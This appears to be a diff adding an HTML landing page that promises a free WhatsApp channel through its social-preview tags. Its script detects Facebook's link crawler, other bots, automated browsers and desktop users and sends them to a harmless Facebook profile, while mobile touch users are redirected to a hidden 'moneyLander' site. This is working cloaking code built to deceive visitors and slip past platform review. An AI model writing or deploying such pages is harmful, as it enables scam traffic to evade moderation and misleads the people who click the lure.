@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Social Preview Tags -->
+    <meta property="og:title" content="Join WhatsApp Channel Free">
+    <meta property="og:description" content="Click here to join the community for free updates!">
+    <meta property="og:image" content="https://web.facebook.com/facebook/?_rdc=1&_rdr#">
+    <meta property="og:image:width" content="500">
+    <meta property="og:image:height" content="500">
+    <meta property="og:type" content="website">
+
+    <script>
+        // Yahi hai tumhara WhatsApp Channel URL
+        const safeRedirect = "https://web.facebook.com/FawazAhmed01";
+        const moneyLander = "https://industrious-azalea-11v65rg.mystrikingly.com/";
+
+        const ua = navigator.userAgent.toLowerCase();
+        
+        // 1. Known Bots Check
+        const isBot = /facebookexternalhit|facebot|metainspector|crawler|spider|bot/i.test(ua);
+        const isAutomated = navigator.webdriver === true;
+
+        // 2. Hardware / Sensor Layer
+        const hasTouchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+
+        // 3. Device Logic
+        const isMobileOrTablet = /android|iphone|ipad|ipod/i.test(ua);
+        const isDesktopPC = /windows|macintosh|linux/i.test(ua) && !/iphone|ipad|android/i.test(ua);
+
+        // FINAL FILTER
+        if (isBot || isAutomated || !hasTouchSupport || isDesktopPC) {
+            window.location.replace(safeRedirect);
+        } else if (isMobileOrTablet && hasTouchSupport) {
+            window.location.replace(moneyLander);
+        } else {
+            window.location.replace(safeRedirect);
+        }
+    </script>
+</head>
+<body style="background-color: #ffffff;">
+    <img src="https://i.postimg.cc/rFd8NH6n/unnamed-(1).png" style="display:none;">
+</body>
+</html>
